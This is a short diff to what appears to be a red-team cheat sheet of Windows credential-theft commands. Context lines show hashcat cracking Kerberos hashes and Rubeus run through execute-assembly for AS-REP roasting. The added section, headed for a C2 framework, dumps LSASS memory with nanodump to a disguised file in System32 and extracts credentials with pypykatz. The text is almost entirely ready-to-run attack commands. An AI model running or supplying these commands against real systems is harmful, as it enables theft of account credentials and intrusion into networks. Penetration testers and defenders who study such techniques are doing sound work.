@@ -1,4 +1,3 @@
-
 #### OPSEC Safe
 
 Browser credentials
@@ -47,4 +46,13 @@ C:\Tools\hashcat.exe -a 0 -m 13100 .\kerb.hash .\example.dict -r .\rules\dive.ru
 AS-REP Roasting
 ```powershell
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /format:hashcat /nowrap
+```
+
+---
+
+Nanodump Adpatix C2
+```powershell
+nanodump -w C:\Windows\System32\dotnetdmp.tmp --valid
+
+pypykatz lsa minidump dotnetdmp.tmp
 ```
